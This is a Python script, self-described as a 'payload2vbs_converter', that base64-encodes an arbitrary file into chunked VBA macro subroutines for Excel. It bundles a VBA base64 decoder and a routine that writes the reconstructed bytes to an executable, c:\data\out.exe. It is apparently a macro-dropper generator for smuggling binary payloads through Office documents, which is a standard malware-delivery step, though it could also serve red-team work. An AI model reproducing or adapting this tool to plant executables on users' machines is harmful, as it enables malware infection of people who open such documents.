import base64
import sys

code = '\n\
Dim fileNum As Integer                                                         \n\
Dim base64_convArr(255)                                                        \n\
Dim base64_initialized As Boolean                                              \n\
                                                                               \n\
Sub base64_init()                                                              \n\
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"  \n\
  For i = 0 To 255                                                             \n\
    base64_convArr(i) = 255                                                    \n\
  Next i                                                                       \n\
  For i = 0 To Len(alphabet) - 1                                               \n\
    value = Asc(Mid(alphabet, i + 1, 1))                                       \n\
    If (base64_convArr(value) <> 255) Then                                     \n\
      Err.Raise 100, "Duplicate in alphabet"                                   \n\
    End If                                                                     \n\
    base64_convArr(value) = i                                                  \n\
  Next i                                                                       \n\
  Rem value for =                                                              \n\
  base64_convArr(61) = 0                                                       \n\
  base64_initialized = True                                                    \n\
End Sub                                                                        \n\
                                                                               \n\
Function base64_decode(data As String) As Byte()                               \n\
  Dim outValue As Long                                                         \n\
  Dim outArray() As Byte                                                       \n\
  If Not base64_initialized Then                                               \n\
    base64_init                                                                \n\
  End If                                                                       \n\
                                                                               \n\
  bufferlen = Len(data) / 4 * 3                                                \n\
  ReDim outArray(bufferlen - 1)                                                \n\
  finallen = bufferlen                                                         \n\
  If (Mid(data, Len(data), 1) = "=") Then                                      \n\
    finallen = finallen - 1                                                    \n\
  End If                                                                       \n\
  If (Mid(data, Len(data) - 1, 1) = "=") Then                                  \n\
    finallen = finallen - 1                                                    \n\
  End If                                                                       \n\
                                                                               \n\
  inIndex = 0                                                                  \n\
  outindex = 0                                                                 \n\
                                                                               \n\
  While inIndex < Len(data)                                                    \n\
    outValue = 0                                                               \n\
    For i = 1 To 4                                                             \n\
      outValue = outValue * 64                                                 \n\
      byteValue = base64_convArr(Asc(Mid(data, inIndex + 1, 1)))               \n\
      If (byteValue = 255) Then                                                \n\
       Err.Raise 101, "Invalid letter in base64"                               \n\
      End If                                                                   \n\
      outValue = outValue Or byteValue                                         \n\
      inIndex = inIndex + 1                                                    \n\
    Next i                                                                     \n\
                                                                               \n\
    rem \ is integer division                                                  \n\
    outArray(outindex) = outValue \ 65536                                      \n\
    outArray(outindex + 1) = (outValue \ 256) And 255                          \n\
    outArray(outindex + 2) = outValue And 255                                  \n\
    outindex = outindex + 3                                                    \n\
  Wend                                                                         \n\
                                                                               \n\
  Rem check ending - if base64 contains padding - bytes must contain zero      \n\
  For i = finallen To bufferlen - 1                                            \n\
    If outArray(i) <> 0 Then                                                   \n\
     Err.Raise 102, "invalid base64 ending"                                    \n\
    End If                                                                     \n\
  Next i                                                                       \n\
                                                                               \n\
  ReDim Preserve outArray(finallen - 1)                                        \n\
  base64_decode = outArray                                                     \n\
                                                                               \n\
End Function                                                                   \n\
                                                                               \n\
Sub sl(line As String)                                                         \n\
Dim data() As Byte                                                             \n\
data = base64_decode(line)                                                     \n\
Put #fileNum,,data                                                             \n\
End Sub                                                                        \n\
'

code2='\
Sub saveFile(filename As String)                         \n\
  Dim value As Long                                      \n\
  fileNum = FreeFile()                                   \n\
  Open filename For Binary Access Write As #fileNum      \n\
  Call PROCESSLINES                                      \n\
  Close fileNum                                          \n\
End Sub                                                  \n\
                                                         \n\
sub test()                                               \n\
savefile("c:\data\out.exe")                              \n\
end sub                                                  \n\
'

def convert_input(file, line_len):
    with open(file, "rb") as f:
        buffer = f.read(line_len)
        while buffer:    
            yield base64.b64encode(buffer)
            buffer = f.read(line_len)

def convert( file, line_len=42):
    max_lines=500
    procedure_number=0
    line_counter=0
    new_sub = True
    with open( file+".out", "wb") as f:
        f.write(code)
        
        # lines should be divided into subs (excel has maximum sub length limit)
        for line in convert_input(file, line_len):
          if new_sub:
            f.write("Sub PLine"+str(procedure_number)+"\n")
            procedure_number=procedure_number+1
            new_sub=False
        
          f.write('sl ("'+line+'")\n')
          line_counter=line_counter+1
          if(line_counter > max_lines):
            f.write("end sub\n")
            new_sub=True
            line_counter=0
        f.write("end sub\n")
        
        f.write("sub processlines\n")
        for i in range(0,procedure_number):
          f.write("pline"+str(i)+"\n")
        f.write("end sub\n")
        f.write(code2)

if len(sys.argv) < 2:
  print("Usage: payload2vbs_converter [file]")
  exit()

convert(sys.argv[1])
print("output written to:"+sys.argv[1]+".out")

